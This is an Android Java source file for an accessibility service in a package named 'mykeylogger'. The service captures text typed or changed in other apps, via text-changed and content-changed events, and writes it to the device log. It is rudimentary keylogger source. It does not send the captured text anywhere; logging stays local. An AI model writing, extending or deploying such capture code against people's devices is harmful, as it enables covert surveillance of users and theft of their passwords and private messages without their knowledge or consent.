package com.example.mykeylogger;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class MyServiceKL extends AccessibilityService {
    public MyServiceKL() {
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //Log.i("TAG1", "event: ");// + event.toString());
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String changedText = getEventText(event);

            if (!TextUtils.isEmpty(changedText)) {
                // Do something with the changed text
                Log.i("TAG1", "Changed Text: " + changedText);
            }
        }
        else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            CharSequence changedText = event.getContentDescription();

            if (changedText != null && !TextUtils.isEmpty(changedText)) {
                // Do something with the changed text
                Log.i("TAG2", "Changed Text: " + changedText);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.i("TAG1", "onInterrupt");
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);

        }
        return sb.toString();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Example: Log that the service is connected
        Log.i("TAG1", "Accessibility service connected");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i("TAG1", "onDestroy");
    }

    /*@Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }*/
}